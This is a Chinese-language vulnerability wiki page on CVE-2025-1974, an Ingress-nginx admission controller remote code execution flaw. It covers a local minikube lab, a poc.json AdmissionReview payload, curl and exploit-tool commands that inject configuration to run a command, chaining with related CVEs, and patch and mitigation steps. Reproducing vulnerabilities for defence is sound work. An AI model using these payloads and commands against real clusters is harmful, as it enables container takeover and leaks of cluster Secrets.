<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Kubernetes Ingress-nginx admission 远程代码执行漏洞 CVE-2025-1974 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Kubernetes Ingress-nginx admission \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2025-1974", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
              {title: "\u6f0f\u6d1e POC", url: "#poc" },
              {title: "\u6f0f\u6d1e\u4fee\u590d", url: "#_5" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Kubernetes%20etcd%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Kubernetes%20etcd%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="btn btn-xs btn-link">
        Kubernetes etcd 未授权访问
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Kubernetes%20API%20Server%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Kubernetes%20API%20Server%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
        Kubernetes API Server 未授权命令执行
      </a>
    </div>
    
  </div>

    

    <h1 id="kubernetes-ingress-nginx-admission-cve-2025-1974">Kubernetes Ingress-nginx admission 远程代码执行漏洞 CVE-2025-1974<a class="headerlink" href="#kubernetes-ingress-nginx-admission-cve-2025-1974" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Ingress-nginx 是 Kubernetes 集群内服务对外暴露的访问接入点，用于承载集群内服务访问流量。其小于 1.12.1 的旧版本中，Kubernetes Ingress-nginx admission 控制器存在一个配置注入漏洞，已获取集群网络访问权限的远程攻击者，可以通过 <code>ValidatingAdmissionWebhook</code> 提交一个配置文件进行验证，并在配置文件中插入恶意配置，实现远程代码执行，导致 Ingress-nginx 所在容器被攻击者控制，并可能导致集群内的 Secrets 泄漏。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://github.com/kubernetes/kubernetes/issues/131009">https://github.com/kubernetes/kubernetes/issues/131009</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-1974">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-1974</a></li>
<li><a href="https://github.com/sandumjacob/IngressNightmare-POCs">https://github.com/sandumjacob/IngressNightmare-POCs</a><ul>
<li>CVE-2025-24513: <a href="https://github.com/kubernetes/kubernetes/issues/131005">kubernetes/kubernetes#131005</a></li>
<li>CVE-2025-24514: <a href="https://github.com/kubernetes/kubernetes/issues/131006">kubernetes/kubernetes#131006</a></li>
<li>CVE-2025-1097: <a href="https://github.com/kubernetes/kubernetes/issues/131007">kubernetes/kubernetes#131007</a></li>
<li>CVE-2025-1098: <a href="https://github.com/kubernetes/kubernetes/issues/131008">kubernetes/kubernetes#131008</a></li>
<li>CVE-2025-1974: <a href="https://github.com/kubernetes/kubernetes/issues/131009">kubernetes/kubernetes#131009</a></li>
</ul>
</li>
<li><a href="https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities">https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities</a></li>
</ul>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>Ingress-nginx &lt; v1.11.0
Ingress-nginx v1.11.0 - 1.11.4
Ingress-nginx v1.12.0
</code></pre></div>
<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>安装 minikube 和 kubectl：</p>
<ul>
<li><a href="https://minikube.sigs.k8s.io/docs/start/">minikube</a></li>
<li><a href="https://kubernetes.io/docs/reference/kubectl/">kubectl</a></li>
</ul>
<p>启动 minikube，本环境的 minikube、kubectl、Kubernetes Server 版本如下：</p>
<div class="highlight"><pre><span></span><code>minikube version
-----
minikube version: v1.33.1
commit: 5883c09216182566a63dff4c326a6fc9ed2982ff
</code></pre></div>
<div class="highlight"><pre><span></span><code>kubectl version
-----
Client Version: v1.30.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
</code></pre></div>
<p>下载 Kubernetes Ingress-nginx 1.11.3 的 <a href="https://github.com/kubernetes/ingress-nginx/blob/f6456ea86c6c330e7cf401ade70ce1faa757265b/deploy/static/provider/cloud/deploy.yaml">deploy.yaml</a>，通过 kubectl 部署资源：</p>
<div class="highlight"><pre><span></span><code>kubectl apply -f deploy.yaml
</code></pre></div>
<p>部署完成后，可执行以下命令查看 ingress-nginx 命名空间中的 pod：</p>
<div class="highlight"><pre><span></span><code>kubectl get pods -n ingress-nginx
-----
NAME                                        READY   STATUS      RESTARTS   AGE
ingress-nginx-admission-create-jmw9x        0/1     Completed   0          24m
ingress-nginx-admission-patch-jbxj6         0/1     Completed   1          24m
ingress-nginx-controller-869748796c-p4jvj   1/1     Running     0          24m
</code></pre></div>
<p><img alt="" src="../images/Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/image-20250413172307109.png" /></p>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>查看 webhook 服务器信息，显示服务器正在监听 8443 端口：</p>
<div class="highlight"><pre><span></span><code>kubectl describe pod ingress-nginx-controller-869748796c-p4jvj -n ingress-nginx
-----
--validating-webhook=:8443
</code></pre></div>
<p><img alt="" src="../images/Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/image-20250413172648584.png" /></p>
<p>使用端口转发访问 webhook 端口：</p>
<div class="highlight"><pre><span></span><code>kubectl port-forward -n ingress-nginx ingress-nginx-controller-869748796c-p4jvj 1337:8443
</code></pre></div>
<p><img alt="" src="../images/Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/image-20250413172813574.png" /></p>
<p>此时，我们已将易受攻击的 webhook 服务器从 pod 转发到本地机器的本地端口 1337。执行 <a href="https://github.com/sandumjacob/IngressNightmare-POCs">poc</a>，发送包含 nginx 配置的 AdmissionRequest：</p>
<div class="highlight"><pre><span></span><code>curl --insecure -v -H &quot;Content-Type: application/json&quot; --data @poc.json https://localhost:1337/fake/path
</code></pre></div>
<p><img alt="" src="../images/Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/image-20250413173013506.png" /></p>
<p>查看日志，以确保执行成功：</p>
<div class="highlight"><pre><span></span><code>kubectl logs ingress-nginx-controller-869748796c-p4jvj -n ingress-nginx
</code></pre></div>
<p><img alt="" src="../images/Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/image-20250413173205563.png" /></p>
<p>CVE-2025-1974 可以与其他漏洞组合利用：</p>
<ul>
<li>CVE-2025-1974 + CVE-2025-24514 → auth-url injection → RCE</li>
<li>CVE-2025-1974 + CVE-2025-1097 → auth-tls-match-cn injection → RCE</li>
<li>CVE-2025-1974 + CVE-2025-1098→ mirror UID injection → RCE</li>
</ul>
<p>本地测试，将端口转发到 <code>localhost</code>：</p>
<div class="highlight"><pre><span></span><code>kubectl port-forward svc/ingress-nginx-controller -n ingress-nginx 8080:80
kubectl port-forward -n ingress-nginx svc/ingress-nginx-controller-admission 8443:443
</code></pre></div>
<p>执行命令 <code>touch /tmp/awesome_poc</code>：</p>
<div class="highlight"><pre><span></span><code>./exp -m c -c &#39;touch /tmp/awesome_poc&#39; -i https://localhost:8443/networking/v1/ingresses -u http://localhost:8080/fake/addr
</code></pre></div>
<p><img alt="" src="../images/Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/image-20250414173754627.png" /></p>
<p><img alt="" src="../images/Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/image-20250414173824804.png" /></p>
<h2 id="poc">漏洞 POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<p>poc.json</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;apiVersion&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admission.k8s.io/v1&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;kind&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AdmissionReview&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;kind&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;group&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;networking.k8s.io&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;v1&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;kind&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Ingress&quot;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;resource&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;group&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;v1&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;resource&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;namespaces&quot;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;CREATE&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;object&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;deads&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;annotations&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;nginx.ingress.kubernetes.io/mirror-host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;test&quot;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">      </span><span class="p">},</span>
<span class="w">      </span><span class="nt">&quot;spec&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;rules&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;jacobsandum.com&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;http&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;paths&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">                </span><span class="p">{</span>
<span class="w">                </span><span class="nt">&quot;path&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;pathType&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Prefix&quot;</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;backend&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nt">&quot;service&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;kubernetes&quot;</span><span class="p">,</span>
<span class="w">                    </span><span class="nt">&quot;port&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="nt">&quot;number&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">]</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="p">],</span>
<span class="w">        </span><span class="nt">&quot;ingressClassName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;nginx&quot;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="_5">漏洞修复<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<ul>
<li>更新至 1.11.5 或 1.12.1 及其以上版本。</li>
<li>确保 admission webhook 端点没有暴露在外。</li>
</ul>
<p>缓解措施：</p>
<ul>
<li>使用 <code>controller.admissionWebhooks.enabled=false</code> 参数重新安装 ingress-nginx；</li>
<li>删除名为 <code>ingress-nginx-admission</code> 的 <code>ValidatingWebhookConfiguration</code> ，并从 <code>ingress-nginx-controller</code> 容器的 Deployment 或 DaemonSet 中删除 <code>--validating-webhook</code> 参数。</li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Kubernetes%20etcd%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Kubernetes%20etcd%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="btn btn-xs btn-link">
        Kubernetes etcd 未授权访问
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Kubernetes%20API%20Server%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Kubernetes%20API%20Server%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
        Kubernetes API Server 未授权命令执行
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>